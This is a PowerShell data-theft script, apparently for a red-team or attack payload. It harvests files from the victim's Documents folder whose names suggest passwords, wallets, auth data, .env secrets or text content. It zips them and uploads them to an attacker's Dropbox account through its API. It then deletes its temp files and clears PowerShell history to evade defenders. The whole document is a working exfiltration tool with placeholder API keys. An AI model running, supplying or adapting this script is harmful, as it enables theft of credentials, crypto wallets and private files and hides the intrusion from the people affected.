# directory to steal from (ALL SUBDIRECTORIES INSIDE AS WELL)
$source = $env:USERPROFILE+"\Documents\*";

##############################################################################################
#                  Dropbox API values: Follow read.me tutorial to get these!                 #
##############################################################################################
# refresh_token
$refreshToken = "REFRESH_TOKEN_HERE";
# App key
$user = 'APP_KEY_HERE';
# App secret
$pass = 'APP_SECRET_HERE';

# temp directory to copy our files to
$dest = $env:TMP+"\cpy";
$n = 0;
$mb = 0;

# Delete the destination directory if it exists
if(Test-Path $dest) { rm -Path $dest -Force -Recurse; }

# find our files and copy them into the temp directory
GCI $source -R -I "*.txt","*wallet*","*.env",".x*",".doc*","*pass*","*auth*" | % {
    $size = ((GCI $_.FullName).length/1MB);
    # ignore files that are too big
    if($size -lt 100) {
        $mb += $size;
        # once we come close to exceeding the dropbox upload limit we switch to a new folder
        if($mb -ge 100) {
            $mb = 0;
            $n++;
        }
        ROBOCOPY $_.Directory ("$dest\$n\") $_.Name /MT 128 /NJH /NJS | Out-Null;
    }
}

$creds = @{
    grant_type = "refresh_token";
    refresh_token = $refreshToken;
};
$headers = @{
    "Authorization" = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("${user}:${pass}"));
    "Content-Type" = "application/x-www-form-urlencoded";
};
$accessToken = (Invoke-RestMethod https://api.dropbox.com/oauth2/token  -Method Post -Body $creds -Headers $headers).access_token;

Add-Type -AssemblyName System.IO.Compression.Filesystem;
$d=get-date -f MM-dd-yyyy;
$t=get-date -f HH-MM-ss;

# convert our files to zip files and then upload to dropbox
for($i = 0; $i -le $n; $i++)
{
    $zip = "$env:TMP\$env:USERNAME-$i-$t.zip";
    [System.IO.Compression.ZipFile]::CreateFromDirectory("$dest\$i\", $zip, 0, $false);
    $target="/$(hostname)-$env:USERNAME/$d/$env:USERNAME-$i-$t.zip";
    $arg = '{ "path": "' + $target + '", "mode": "add", "autorename": true, "mute": false }';
    $headers = @{
        "Authorization" = "Bearer $accessToken";
        "Content-Type" = "application/octet-stream";
        "Dropbox-API-Arg" = $arg;
    };
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $zip -Headers $headers | Out-Null;
}

# delete the temp directory
rm $dest -Force -Recurse;
# delete the zip files
for($i = 0; $i -le $n; $i++)
{
    rm "$env:TMP\$env:USERNAME-$i-$t.zip" -Force;
}

# hide our traces (only will delay blue team -- not totally prevent them from seeing the traces)
Clear-History;
rm "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\*";
exit;